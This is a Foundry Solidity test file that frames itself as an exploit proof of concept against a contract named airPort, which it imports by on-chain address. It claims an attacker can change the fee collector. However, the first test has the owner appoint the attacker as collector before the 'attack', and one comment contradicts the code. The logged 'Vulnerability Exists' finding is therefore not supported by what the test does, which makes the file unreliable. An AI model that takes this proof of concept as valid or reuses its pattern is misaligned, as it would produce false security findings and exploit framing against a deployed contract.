// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol";

contract AirPortTest is Test {
    airPort public feeContract;
    address public owner = address(0x1);
    address public attacker = address(0x999);

    function setUp() public {
        vm.prank(owner);
        feeContract = new airPort();
    }

    function testUnprotectedFeeCollector() public {
        // Verify original fee collector is owner
        vm.prank(owner);
        feeContract.setFeeCollector(attacker);

        // Take pre-attack state snapshot
        console.log("--- BEFORE-Trigger FeeCollector ---");
        address preAttackFeeCollector = feeContract.feeCollector();
        console.log("Fee collector pre-attack:", preAttackFeeCollector);

        console.log("--- Trigger: attacker calls setFeeCollector ---");
        // Attacker changes fee collector
        vm.prank(attacker);
        feeContract.setFeeCollector(address(0));

        // Take post-attack state snapshot
        console.log("--- AFTER-Trigger FeeCollector ---");
        address postAttackFeeCollector = feeContract.feeCollector();
        console.log("Fee collector post-attack:", postAttackFeeCollector);

        // Differential validation
        if (postAttackFeeCollector == address(0)) {
            console.log("Vulnerability Exists: Attacker successfully changed fee collector to address(0)");
        } else {
            console.log("Vulnerability not Exist: Attacker failed to change fee collector");
        }

        // Original assertion
        assertEq(feeContract.feeCollector(), address(0));
    }

    function testNonOwnerCannotSet() public {
        // Non-owner fails to set fee collector
        vm.prank(attacker);
        vm.expectRevert("Only fee collector can change");
        feeContract.setFeeCollector(attacker);
    }
}